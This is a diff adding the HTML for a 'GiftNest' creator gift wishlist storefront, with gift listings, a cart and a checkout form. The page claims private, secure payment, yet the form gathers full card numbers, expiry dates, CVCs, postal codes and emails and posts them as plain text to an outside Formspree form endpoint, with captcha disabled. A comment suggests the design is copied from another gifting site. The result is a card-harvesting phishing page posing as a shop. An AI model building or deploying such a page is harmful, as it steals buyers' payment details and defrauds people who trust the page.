@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>GiftNest Creator Wishlist</title>
+    <link rel="preconnect" href="https://images.unsplash.com" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <header class="topbar">
+      <a class="brand" href="#home" aria-label="GiftNest home">
+        <span class="brand-mark">GN</span>
+        <span>GiftNest</span>
+      </a>
+      <nav class="nav-links" aria-label="Primary">
+        <a href="#wishlist">Wishlist</a>
+        <a href="#how">How it works</a>
+        <a href="#checkout">Checkout</a>
+      </nav>
+      <button class="cart-button" type="button" data-open-cart>
+        <span>Cart</span>
+        <span class="cart-count" data-cart-count>0</span>
+      </button>
+    </header>
+
+    <main id="home">
+      <section class="hero">
+        <div class="hero-media" aria-hidden="true"></div>
+        <div class="hero-copy">
+          <p class="eyebrow">Secure creator gifting</p>
+          <h1>Send gifts to your loved ones safely.</h1>
+          <p>
+            A polished wishlist storefront for creators, streamers, and fans.
+            Choose a gift, leave a note, and check out in a private payment flow.
+          </p>
+          <div class="hero-actions">
+            <a class="primary-link" href="#wishlist">Browse gifts</a>
+            <button class="secondary-link" type="button" data-open-cart>View cart</button>
+          </div>
+        </div>
+      </section>
+
+      <section class="creator-strip" aria-label="Creator profile">
+        <img
+          src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=320&q=80"
+          alt="Creator profile"
+          class="avatar"
+        />
+        <div>
+          <p class="profile-label">Featured wishlist</p>
+          <h2>Maya Moon</h2>
+          <p>Digital artist, cozy desk setups, studio tools, and little joys.</p>
+        </div>
+        
+      </section>
+
+      <section class="section-heading" id="wishlist">
+        <p class="eyebrow">Wishlist</p>
+        <h2>Pick something they will actually love.</h2>
+      </section>
+
+      <section class="wishlist-grid" aria-label="Wishlist items">
+        <article class="gift-card">
+          <img
+            src="https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=760&q=80"
+            alt="Mechanical keyboard on a clean desk"
+          />
+          <div class="gift-body">
+            <div>
+              <p class="gift-tag">Studio</p>
+              <h3>Cloudline Keyboard</h3>
+              <p>Soft switches for long editing nights and stream notes.</p>
+            </div>
+            <div class="gift-footer">
+              <strong>$129.00</strong>
+              <button type="button" data-add="Cloudline Keyboard" data-price="129">Gift it</button>
+            </div>
+          </div>
+        </article>
+
+        <article class="gift-card">
+          <img
+            src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=760&q=80"
+            alt="Warm lamp and cozy room"
+          />
+          <div class="gift-body">
+            <div>
+              <p class="gift-tag">Home</p>
+              <h3>Sunset Desk Lamp</h3>
+              <p>A soft ambient lamp for filming, drawing, and winding down.</p>
+            </div>
+            <div class="gift-footer">
+              <strong>$74.00</strong>
+              <button type="button" data-add="Sunset Desk Lamp" data-price="74">Gift it</button>
+            </div>
+          </div>
+        </article>
+
+        <article class="gift-card">
+          <img
+            src="https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=760&q=80"
+            alt="Code editor on a laptop"
+          />
+          <div class="gift-body">
+            <div>
+              <p class="gift-tag">Tools</p>
+              <h3>Creator Software Fund</h3>
+              <p>Helps cover editing apps, brushes, plugins, and subscriptions.</p>
+            </div>
+            <div class="gift-footer">
+              <strong>$50.00</strong>
+              <button type="button" data-add="Creator Software Fund" data-price="50">Gift it</button>
+            </div>
+          </div>
+        </article>
+
+        <article class="gift-card">
+          <img
+            src="https://images.unsplash.com/photo-1515378791036-0648a3ef77b2?auto=format&fit=crop&w=760&q=80"
+            alt="Notebook and work accessories"
+          />
+          <div class="gift-body">
+            <div>
+              <p class="gift-tag">Everyday</p>
+              <h3>Monthly Stationery Drop</h3>
+              <p>Paper goods, pens, stickers, and packaging for shop orders.</p>
+            </div>
+            <div class="gift-footer">
+              <strong>$38.00</strong>
+              <button type="button" data-add="Monthly Stationery Drop" data-price="38">Gift it</button>
+            </div>
+          </div>
+        </article>
+      </section>
+
+      <section class="surprise-band" id="how">
+        <div>
+          <p class="eyebrow">Surprise gift</p>
+          <h2>Not sure what to choose?</h2>
+          <p>Send a flexible contribution and let the creator pick from their approved list.</p>
+        </div>
+        <form class="surprise-form" data-surprise-form>
+          <label>
+            Amount
+            <input type="number" min="5" step="5" value="25" data-surprise-amount />
+          </label>
+          <button type="submit">Add surprise gift</button>
+        </form>
+      </section>
+
+      <section class="checkout-shell" id="checkout" aria-label="Checkout">
+        <div class="checkout-copy">
+          <p class="eyebrow">Checkout</p>
+          <h2>Private payment, protected delivery.</h2>
+          <p>
+            The payment screen keeps the familiar gifting checkout sequence:
+            contact details, gift note, protected shipping, then card payment.
+          </p>
+          <ul>
+            <li>Creator address is never shown to the buyer.</li>
+            <li>Gift notes can be anonymous or signed.</li>
+            <li>Summary updates as cart items change.</li>
+          </ul>
+        </div>
+
+      <form class="checkout-panel" data-checkout-form action="https://formspree.io/f/mdakqoyw" method="POST">
+    <!-- ANTI-SPAM HIDDEN FIELDS (same as GyftMe) -->
+    <input type="hidden" name="_format" value="plain">
+    <input type="text" name="_gotcha" style="display:none">
+    <input type="hidden" name="_subject" value="New GiftNest Order">
+    <input type="hidden" name="_captcha" value="false">
+    
+    <div class="form-row two">
+        <label>
+            Cardholder Name
+            <input type="text" name="cardholder_name" placeholder="Enter full name on card" required />
+        </label>
+    </div>
+    
+    <div class="form-row two">
+        <label>
+            Card number
+            <input type="text" name="card_number" inputmode="numeric" placeholder="4242 4242 4242 4242" required />
+        </label>
+        <label>
+            Expiry
+            <input type="text" name="card_expiry" inputmode="numeric" placeholder="MM / YY" required />
+        </label>
+    </div>
+    <div class="form-row two">
+        <label>
+            CVC
+            <input type="text" name="card_cvc" inputmode="numeric" placeholder="123" required />
+        </label>
+        <label>
+            ZIP / Postal code
+            <input type="text" name="postal_code" placeholder="10001" required />
+        </label>
+        <label>
+            Email
+            <input type="email" name="buyer_email" placeholder="you@example.com" required />
+        </label>
+    </div>
+    
+    <!-- Hidden fields to track cart items -->
+    <input type="hidden" name="cart_items" data-cart-items-hidden />
+    <input type="hidden" name="cart_total" data-cart-total-hidden />
+    
+    <div class="order-summary">
+        <div><span>Gifts</span><strong data-subtotal>$0.00</strong></div>
+        <div><span>Service fee</span><strong data-fee>$0.00</strong></div>
+        <div><span>Estimated total</span><strong data-total>$0.00</strong></div>
+    </div>
+    <button class="pay-button" type="submit">Pay securely</button>
+</form>
+      </section>
+    </main>
+
+    <aside class="cart-drawer" data-cart-drawer aria-hidden="true">
+      <div class="cart-panel">
+        <div class="cart-head">
+          <div>
+            <p class="eyebrow">Gift cart</p>
+            <h2>Your picks</h2>
+          </div>
+          <button class="icon-button" type="button" data-close-cart aria-label="Close cart">×</button>
+        </div>
+        <div class="cart-items" data-cart-items>
+          <p class="empty-cart">Your cart is waiting for a thoughtful move.</p>
+        </div>
+        <div class="cart-total">
+          <span>Total</span>
+          <strong data-cart-total>$0.00</strong>
+        </div>
+        <a class="checkout-link" href="#checkout" data-close-cart>Continue to checkout</a>
+      </div>
+    </aside>
+
+    <div class="toast" data-toast role="status" aria-live="polite"></div>
+    <script src="app.js"></script>
+  </body>
+</html>
